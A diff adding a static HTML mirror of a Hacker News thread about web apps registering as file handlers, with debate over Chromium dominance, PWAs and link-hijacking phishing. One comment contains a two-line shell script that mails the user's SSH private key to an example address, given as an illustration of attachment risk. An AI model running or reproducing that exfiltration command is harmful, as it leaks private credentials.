@@ -1,0 +1,1760 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+<meta name="pinterest" content="nopin">
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+
+<link rel="canonical" href="https://davidejones.github.io/hugo-hn/2021/06/14/let-web-applications-be-file-handlers/">
+
+
+    <title>Let web applications be file handlers - Hugo Hacker News</title>
+    
+<meta name="description" content="">
+
+<meta property="og:title" content="Let web applications be file handlers - Hugo Hacker News">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://davidejones.github.io/hugo-hn/2021/06/14/let-web-applications-be-file-handlers/">
+<meta property="og:image" content="https://davidejones.github.io/hugo-hn/images/default.png">
+<meta property="og:site_name" content="Hugo Hacker News">
+<meta property="og:description" content="">
+<meta property="og:locale" content="ja_JP">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="Hugo Hacker News">
+<meta name="twitter:url" content="https://davidejones.github.io/hugo-hn/2021/06/14/let-web-applications-be-file-handlers/">
+<meta name="twitter:title" content="Let web applications be file handlers - Hugo Hacker News">
+<meta name="twitter:description" content="">
+<meta name="twitter:image" content="https://davidejones.github.io/hugo-hn/images/default.png">
+
+
+<script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "NewsArticle",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id":"https:\/\/davidejones.github.io\/hugo-hn\/"
+    },
+    "headline": "Let web applications be file handlers - Hugo Hacker News",
+    "image": {
+      "@type": "ImageObject",
+      "url": "https:\/\/davidejones.github.io\/hugo-hn\/images\/default.png",
+      "height": 800,
+      "width": 800
+    },
+    "datePublished": "2021-06-14T12:23:17JST",
+    "dateModified": "2021-06-14T12:23:17JST",
+    "author": {
+      "@type": "Person",
+      "name": "Hugo Hacker News"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Hugo Hacker News",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https:\/\/davidejones.github.io\/hugo-hn\/images/logo.png",
+        "width": 600,
+        "height": 60
+      }
+    },
+    "description": ""
+  }
+</script>
+
+
+
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+
+    
+    
+    
+    
+        
+    
+    
+    <link href="https://davidejones.github.io/hugo-hn/style.min.15f5cccbc1e29fb1929e0949e1bf4961e60580fc971c4f02c278a398217fb57d230b7f7d4d55723192e7808bd1efeb5e006c59e16b06f888a56502320ce1e0c1.css" rel="stylesheet" />
+</head>
+<body class="post">
+    <header>
+        <a href="https://davidejones.github.io/hugo-hn/">Hugo Hacker News</a>
+        <nav>
+            <ul>
+                
+                    <li><a href="/hugo-hn/">new</a></li>
+                
+                    <li><a href="/hugo-hn/comments/">comments</a></li>
+                
+                    <li><a href="/hugo-hn/categories/show/">show</a></li>
+                
+                    <li><a href="/hugo-hn/categories/ask/">ask</a></li>
+                
+                    <li><a href="/hugo-hn/categories/jobs/">jobs</a></li>
+                
+                    <li><a href="https://news.ycombinator.com/submit">submit</a></li>
+                
+            </ul>
+        </nav>
+        <select onchange="myChangeHandler(this)">
+            
+                <option value="/hugo-hn/">new</option>
+            
+                <option value="/hugo-hn/comments/">comments</option>
+            
+                <option value="/hugo-hn/categories/show/">show</option>
+            
+                <option value="/hugo-hn/categories/ask/">ask</option>
+            
+                <option value="/hugo-hn/categories/jobs/">jobs</option>
+            
+                <option value="https://news.ycombinator.com/submit">submit</option>
+            
+        </select>
+    </header>
+    <main>
+        
+<article>
+    <header>
+        <h1><a href="https://web.dev/file-handling/">Let web applications be file handlers</a></h1>
+        
+    </header>
+    
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=sorenjan" target="_blank">sorenjan</a>   <span class="timeago" data-date="2021-06-14 13:57:08 &#43;0000 UTC">2021-06-14 13:57:08 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            I don&#x27;t like that they refer to web apps and browser when they actually mean Chromium apps on the web and Chromium based browsers. Reminds me of a certain embrace, extend strategy.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=roberto" target="_blank">roberto</a>   <span class="timeago" data-date="2021-06-14 14:56:49 &#43;0000 UTC">2021-06-14 14:56:49 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            They mean progressive web apps, and they exist in other browsers. Firefox, eg: <a href="https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;Progressive_web_apps&#x2F;Add_to_home_screen#How_do_you_make_an_app_A2HS-ready" rel="nofollow">https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;Progressive_web...</a><p>More info: <a href="https:&#x2F;&#x2F;web.dev&#x2F;install-criteria&#x2F;" rel="nofollow">https:&#x2F;&#x2F;web.dev&#x2F;install-criteria&#x2F;</a>
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=sorenjan" target="_blank">sorenjan</a>   <span class="timeago" data-date="2021-06-14 15:40:09 &#43;0000 UTC">2021-06-14 15:40:09 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            They write &quot;Now that web apps are capable of reading and writing files&quot;, and link to their article about the File System Access API, which is a Chromium only API. They&#x27;re trying to make it look like Chrome only apps are regular web apps, and if they doesn&#x27;t work in other browsers that&#x27;s on them and you should just switch to Chrome instead. They want Chrome to be thought of as the default web experience.<p><a href="https:&#x2F;&#x2F;caniuse.com&#x2F;native-filesystem-api" rel="nofollow">https:&#x2F;&#x2F;caniuse.com&#x2F;native-filesystem-api</a>
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=spystath" target="_blank">spystath</a>   <span class="timeago" data-date="2021-06-14 17:17:05 &#43;0000 UTC">2021-06-14 17:17:05 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            This might be me being pessimistic but there are no web standards any more. It&#x27;s Chrome standards. You can fall in line or drift into obsolescence. We never really got rid of the IE dominance on the web, we merely exchanged one boss for another. I get it it&#x27;s not _quite_ the same since we don&#x27;t have the ActiveX nonsense any more but it certainly feels like we&#x27;re living in Google&#x27;s vision of the web. Monocultures are harmful but that&#x27;s we get to live with.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=dfabulich" target="_blank">dfabulich</a>   <span class="timeago" data-date="2021-06-14 16:46:33 &#43;0000 UTC">2021-06-14 16:46:33 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            There are basically four votes that matter, corresponding to the four major browsers: Google (Chrome), Apple (Safari), Microsoft (Edge) and Mozilla (Firefox).<p>Google claims that &quot;browsers&quot; support an API if it&#x27;s supported in Chrome and in Microsoft Edge, a Chromium-based browser.<p>I think that&#x27;s a fair claim, because MS does sometimes block Chromium features that they don&#x27;t like. <a href="https:&#x2F;&#x2F;www.techradar.com&#x2F;news&#x2F;microsoft-edge-becomes-latest-browser-to-disable-googles-floc" rel="nofollow">https:&#x2F;&#x2F;www.techradar.com&#x2F;news&#x2F;microsoft-edge-becomes-latest...</a><p>Microsoft could have blocked File System Access, for some of the same reasons that Mozilla did, but they didn&#x27;t; they elected to enable the feature.<p>Since Microsoft + Google together have 70% share of desktop web, and since Microsoft agrees with Google that the File System Access API is a good thing for the web, I think it&#x27;s not wrong to say that &quot;browsers&quot; support this feature.<p>Now, you might say, &quot;Microsoft shouldn&#x27;t count!&quot; but Edge&#x27;s market share is bigger than Firefox, and we all agree that Mozilla&#x27;s vote should count (at least as long as they can hang on to 3% market share).
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=jfrunyon" target="_blank">jfrunyon</a>   <span class="timeago" data-date="2021-06-14 15:44:20 &#43;0000 UTC">2021-06-14 15:44:20 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Firefox doesn&#x27;t support PWA and has no plans to. <a href="https:&#x2F;&#x2F;bugzilla.mozilla.org&#x2F;show_bug.cgi?id=1682593#c8" rel="nofollow">https:&#x2F;&#x2F;bugzilla.mozilla.org&#x2F;show_bug.cgi?id=1682593#c8</a>
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=kevincox" target="_blank">kevincox</a>   <span class="timeago" data-date="2021-06-14 16:43:23 &#43;0000 UTC">2021-06-14 16:43:23 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Note that PWA is a concept, not a specific set of features or APIs. This makes a lot of this discussion confusing and mostly meaningless. Furthermore this bug is about a browser feature. The similar &quot;PWA&quot; API here would be <a href="https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;Manifest&#x2F;display" rel="nofollow">https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;Manifest&#x2F;displa...</a> which is supported by Firefox for Android so it isn&#x27;t like Firefox won&#x27;t support &quot;PWA&quot; as a whole and will reject all of the related APIs.<p>And remember that PWA is <i>Progressive</i> Web Application. The P is from Progressive Enhancement[1]. This means that missing an API or two doesn&#x27;t mean that your browser doesn&#x27;t support PWAs. It just means that some PWAs will have less functions or give a less &quot;app-like&quot; experience.<p>[1] <a href="https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Progressive_enhancement" rel="nofollow">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Progressive_enhancement</a><p>TL;DR that bug is mostly meaningless, the underlying APIs are what matter.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=jfrunyon" target="_blank">jfrunyon</a>   <span class="timeago" data-date="2021-06-14 17:48:36 &#43;0000 UTC">2021-06-14 17:48:36 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            &quot;Sure, they don&#x27;t support PWAs, but they support pieces of PWAs, so really they support PWAs&quot;
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=outloudvi" target="_blank">outloudvi</a>   <span class="timeago" data-date="2021-06-14 14:06:21 &#43;0000 UTC">2021-06-14 14:06:21 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            It&#x27;s actually Chrome-style embrace-extend-extinguish.<p><a href="https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Embrace%2C_extend%2C_and_extinguish" rel="nofollow">https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Embrace%2C_extend%2C_and_extin...</a>
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=al2o3cr" target="_blank">al2o3cr</a>   <span class="timeago" data-date="2021-06-14 16:01:16 &#43;0000 UTC">2021-06-14 16:01:16 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Oh great, another API that dodgy sites will try to trick users into giving access to (see also every &quot;do you want notifications from this site?&quot; popup)
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=vbezhenar" target="_blank">vbezhenar</a>   <span class="timeago" data-date="2021-06-14 17:12:57 &#43;0000 UTC">2021-06-14 17:12:57 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            First thing I do with my Chrome is opening Settings&#x2F;Site Settigs, Additional Permissions and blocking almost everything in this list. There&#x27;s surprising number of APIs that I&#x27;ll never need (MIDI devices? I have no idea what MIDI device is and I definitely don&#x27;t own one. Payment handlers? I&#x27;m using cash, thanks. Augmented reality? I&#x27;m fine with ordinary one, thanks.).
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=Santosh83" target="_blank">Santosh83</a>   <span class="timeago" data-date="2021-06-14 16:19:43 &#43;0000 UTC">2021-06-14 16:19:43 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Firefox cannot meaningfully stand up to Chrome&#x27;s dominance with ~5% market share and dev layoffs. The iDevices and their locked in Webkit engine is all that forces Google to at least propose web standard drafts and keep up even the appearance of interoperability.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=dfabulich" target="_blank">dfabulich</a>   <span class="timeago" data-date="2021-06-14 16:50:26 &#43;0000 UTC">2021-06-14 16:50:26 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Firefox is at ~3% market share now. Mozilla lost a full point over the last year. <a href="https:&#x2F;&#x2F;gs.statcounter.com&#x2F;browser-market-share" rel="nofollow">https:&#x2F;&#x2F;gs.statcounter.com&#x2F;browser-market-share</a>
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=jjice" target="_blank">jjice</a>   <span class="timeago" data-date="2021-06-14 17:43:46 &#43;0000 UTC">2021-06-14 17:43:46 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            As a Firefox user, I&#x27;m not completely surprised. There are multiple video call applications I tried to use that didn&#x27;t work on Firefox (on Linux at least). I personally have Chrome installed for the sole purpose of resolving those situations and go right back to FF. I&#x27;m scared though for FireFox, because they aren&#x27;t doing too hot. I don&#x27;t want a Google dominated web. Having the only two real web competitors be Apple and Google is a terrifying idea. Hell, it doesn&#x27;t event have to be FireFox, I just want some more competition, but browsers are so complex at this point that I don&#x27;t think we can ever get to that point.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=brnt" target="_blank">brnt</a>   <span class="timeago" data-date="2021-06-14 13:38:36 &#43;0000 UTC">2021-06-14 13:38:36 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            I wish desktop browsers had domain handling. I&#x27;d like to open youtube links by default in Freetube, or somesuch. On my phone, I can configure this, on the desktop, I cannot.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=captn3m0" target="_blank">captn3m0</a>   <span class="timeago" data-date="2021-06-14 16:32:52 &#43;0000 UTC">2021-06-14 16:32:52 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            We&#x27;re halfway there with the URL Protocol handler part in Web Application manifest specification (that currently only supports protocols, not websites).<p><a href="https:&#x2F;&#x2F;github.com&#x2F;MicrosoftEdge&#x2F;MSEdgeExplainers&#x2F;blob&#x2F;main&#x2F;URLProtocolHandler&#x2F;explainer.md" rel="nofollow">https:&#x2F;&#x2F;github.com&#x2F;MicrosoftEdge&#x2F;MSEdgeExplainers&#x2F;blob&#x2F;main&#x2F;...</a>
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=mankyd" target="_blank">mankyd</a>   <span class="timeago" data-date="2021-06-14 13:55:05 &#43;0000 UTC">2021-06-14 13:55:05 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            This is probably a bad security practice. When you click mybank.com, you don&#x27;t want it silently redirecting to mybank.phishing.com.<p>Links are explicit. You could always right up a trivial browser extension to do this on a case by case basis if you really desire.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=mqus" target="_blank">mqus</a>   <span class="timeago" data-date="2021-06-14 14:06:17 &#43;0000 UTC">2021-06-14 14:06:17 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            I think what brnt means is that he wants some links to open in an entirely different app and not in a browser. I don&#x27;t see how phishing is applicable in this case. In fact it may be a good measure against it since you quickly see that it does not open in your usual app
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=CobsterLock" target="_blank">CobsterLock</a>   <span class="timeago" data-date="2021-06-14 14:33:54 &#43;0000 UTC">2021-06-14 14:33:54 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            I think mankyd knew that. I&#x27;m thinking the exploit would be installing a bad app that enforces redirects for mybank.com, youbank.com, usabank.com, ukbank.com, allbanks.com to their malicious app. Then the app just knows how to pretend to be the login screen for all these apps and bam you get a whole ton of passwords. The key thing would be for the app not to show the url of their malicious site.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=danShumway" target="_blank">danShumway</a>   <span class="timeago" data-date="2021-06-14 14:49:41 &#43;0000 UTC">2021-06-14 14:49:41 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Phones already do this though, don&#x27;t they? I think Android at least allows redirecting links to apps, and I&#x27;m pretty sure Mac does as well.<p>Is there a bigger threat model people are worried about with extending the app schema to include normal URLs as well? Or do you just think the problem would be worse if the scope was broader?<p>Trying to figure out where people are drawing the line on this.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=machello13" target="_blank">machello13</a>   <span class="timeago" data-date="2021-06-14 15:45:47 &#43;0000 UTC">2021-06-14 15:45:47 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            On iOS and macOS (I can&#x27;t speak to Android but I&#x27;m fairly sure it&#x27;s a similar mechanism), you&#x27;re required to prove that a domain and app are linked before allowing URLs to open in your app. You do this by hosting a JSON file on your website that points to your app and specifies which kind of URLs should be redirected. E.g. see <a href="https:&#x2F;&#x2F;apple.com&#x2F;.well-known&#x2F;apple-app-site-association" rel="nofollow">https:&#x2F;&#x2F;apple.com&#x2F;.well-known&#x2F;apple-app-site-association</a> for how Apple.com does it.<p>This prevents malicious third-parties from opening bank.com in their own app, but of course it also prevents useful things like using a custom YouTube app.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=ivanmontillam" target="_blank">ivanmontillam</a>   <span class="timeago" data-date="2021-06-14 15:07:46 &#43;0000 UTC">2021-06-14 15:07:46 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Yes, but phones do have curated mobile app stores. Not the case with desktop computers, so it&#x27;s dangerous.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=danShumway" target="_blank">danShumway</a>   <span class="timeago" data-date="2021-06-14 15:17:16 &#43;0000 UTC">2021-06-14 15:17:16 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Hrm. Mac computers allow this with Slack. The installed version can intercept links to messages in the browser and open them in the app instead of the website. So I don&#x27;t think it&#x27;s just phones doing this today.<p>And I guess Slack is signed on Mac via Gatekeeper, but it&#x27;s not distributed through an app store.<p>I don&#x27;t run Windows and I won&#x27;t install Slack natively on my Linux boxes, so I can&#x27;t check the other platforms. But I would be a little surprised if the same doesn&#x27;t work on them. This is basically how mailto links work today, right?<p>See <a href="https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;API&#x2F;Navigator&#x2F;registerProtocolHandler&#x2F;Web-based_protocol_handlers" rel="nofollow">https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;API&#x2F;Navigator&#x2F;r...</a>
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=notriddle" target="_blank">notriddle</a>   <span class="timeago" data-date="2021-06-14 17:55:04 &#43;0000 UTC">2021-06-14 17:55:04 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            &gt; Hrm. Mac computers allow this with Slack.<p>On Linux, Slack installs a custom protocol handler, and includes a hidden iframe with the slack:&#x2F;&#x2F;RANDOMSTRING&#x2F;magic-login&#x2F;LONGRANDOMSTRING URL. I assume it&#x27;s the same on Mac.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=ivanmontillam" target="_blank">ivanmontillam</a>   <span class="timeago" data-date="2021-06-14 17:26:57 &#43;0000 UTC">2021-06-14 17:26:57 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            In this case mailto:&#x2F;&#x2F; doesn&#x27;t try to impersonate any app, but if it were to be done (for example) &quot;skype:&#x2F;&#x2F;&quot; I could install another app that overrides the current app protocol, and mislead the user and catch privileged data intended for the original app.<p>But of course, technically it&#x27;s the exact same thing, it&#x27;s just a layer above. So you have a point.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=mschuster91" target="_blank">mschuster91</a>   <span class="timeago" data-date="2021-06-14 14:28:56 &#43;0000 UTC">2021-06-14 14:28:56 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            &gt; In fact it may be a good measure against it since you quickly see that it does not open in your usual app<p>There&#x27;s <i>nothing</i> preventing a bad actor from copying the existing banking app and attaching a backdoor, assuming local code execution capability - either re-sign it with a local codesign certificate or use runtime code injection&#x2F;linker overrides.<p>A web app has always the URL bar and the banking site can rely on HSTS to prevent man-in-the-middle attacks.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=mqus" target="_blank">mqus</a>   <span class="timeago" data-date="2021-06-14 16:33:01 &#43;0000 UTC">2021-06-14 16:33:01 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            &gt; There&#x27;s nothing preventing a bad actor from copying the existing banking app and attaching a backdoor<p>Getting an app to a user is imho FAR more difficult than showing him a website. (Fake ones even more so)<p>How easily would you click on a link if I would provide it here vs How easily would you install a new program if I provided you a link here?
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=ubercow13" target="_blank">ubercow13</a>   <span class="timeago" data-date="2021-06-14 13:46:23 &#43;0000 UTC">2021-06-14 13:46:23 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            You could make every youtube page redirect to freetube with a userscript
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=" target="_blank"></a>   <span class="timeago" data-date="2021-06-14 13:41:45 &#43;0000 UTC">2021-06-14 13:41:45 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=no-dr-onboard" target="_blank">no-dr-onboard</a>   <span class="timeago" data-date="2021-06-14 15:48:26 &#43;0000 UTC">2021-06-14 15:48:26 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Not sure if anyone else is seeing the push here to move more of the OSI (whatever, sue me) stack over to the app layer.<p>Latest two that come to mind is DoH integrations in the browser and app specific file handling.<p>Of course, the question is &quot;well why?&quot; needs to be asked. The (non)conspiratorial answer to this is &quot;because Chrome wants more control.&quot; We&#x27;re way past the era where a web browser was just something that handles just the DOM.<p>Chrome kernel users when? What about Chrome kernel modules? Where do you draw the line?
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=mr-wendel" target="_blank">mr-wendel</a>   <span class="timeago" data-date="2021-06-14 15:10:16 &#43;0000 UTC">2021-06-14 15:10:16 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Ugh, please, no.<p><pre><code>  - I&#x27;m already tired of constant browser native pop-ups asking for access to things. This is just asking for the same treatment: &quot;The site memes.example.com wants to be able to open .gif files. [Allow] [Deny]&quot;
+
+  - Does this mean all that extra javascript gets access to the file? This isn&#x27;t an anti-javascript rant, but your average 3rd-party site is loading code from all over the web and it&#x27;s impossible to expect users to understand the implications of &quot;open nopebaby.gif with ...&quot;. I mean, the OS is making it easy, so it must be safe!
+</code></pre>
+Having a thick interface between your files and websites is a feature, not a bug.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=cbm-vic-20" target="_blank">cbm-vic-20</a>   <span class="timeago" data-date="2021-06-14 13:39:45 &#43;0000 UTC">2021-06-14 13:39:45 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            First, we had centralized time-sharing systems, which gave way to decentralized applications running on PCs.  Back to centralization with early web applications, and now back to decentralized apps running in the browser.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=tazjin" target="_blank">tazjin</a>   <span class="timeago" data-date="2021-06-14 13:44:42 &#43;0000 UTC">2021-06-14 13:44:42 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            &gt; and now back to decentralized apps running in the browser<p>I think it&#x27;s now both, because things won&#x27;t work correctly if you&#x27;re offline for the most part. Tarpit diving.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=tyingq" target="_blank">tyingq</a>   <span class="timeago" data-date="2021-06-14 13:51:04 &#43;0000 UTC">2021-06-14 13:51:04 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            It does have a sort of trojan-horse feel to it, since prior attempts to lock down desktops in the same way as iOS didn&#x27;t work out well.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+                
+
+
+    
+    <div class="comment ">
+        <p><a href="https://news.ycombinator.com/user?id=api" target="_blank">api</a>   <span class="timeago" data-date="2021-06-14 13:48:38 &#43;0000 UTC">2021-06-14 13:48:38 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Web apps are centralized. They almost never work without a constant link to the server. The browser is basically the 21st century equivalent of the VT terminal.<p>We are in what I call the mainframe 2.0 era.
+        </div>
+        <div class="children">
+            
+        </div>
+    </div>
+
+
+            
+        </div>
+    </div>
+
+
+        
+            
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=k__" target="_blank">k__</a>   <span class="timeago" data-date="2021-06-14 13:20:05 &#43;0000 UTC">2021-06-14 13:20:05 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Cool.<p>I like how the web gets native features, but unlike (non-mobile) native apps before, emphasizes security.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=superkuh" target="_blank">superkuh</a>   <span class="timeago" data-date="2021-06-14 13:27:02 &#43;0000 UTC">2021-06-14 13:27:02 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Web &quot;applications&quot; better have security in mind. For the end user running arbitrary JS with even more bare metal abilities it is just about as crazy as executing every attachment you receive in email.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=geofft" target="_blank">geofft</a>   <span class="timeago" data-date="2021-06-14 13:47:22 &#43;0000 UTC">2021-06-14 13:47:22 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
+            Very much not so?<p>Here&#x27;s an email attachment that compromises your SSH private key:<p><pre><code>    #!&#x2F;bin&#x2F;sh
+    mail geofft@example.com &lt;  ~&#x2F;.ssh&#x2F;id_rsa
+</code></pre>
+(With obvious changes for other OSes, but that&#x27;s roughly the complexity of it, everywhere.)<p>Can you provide an example of &quot;arbitrary JS with even more bare metal abilities&quot; that can do the same thing? I&#x27;ll even visit your website, with JavaScript enabled, on my laptop with a private key that can access GitHub.
+        </div>
+        <div class="children">
+            
+                
+
+
+    
+    <div class="comment hasChildren">
+        <p><a href="https://news.ycombinator.com/user?id=superkuh" target="_blank">superkuh</a>   <span class="timeago" data-date="2021-06-14 14:18:25 &#43;0000 UTC">2021-06-14 14:18:25 &#43;0000 UTC</span> [ - ]</p>
+        <div class="body">
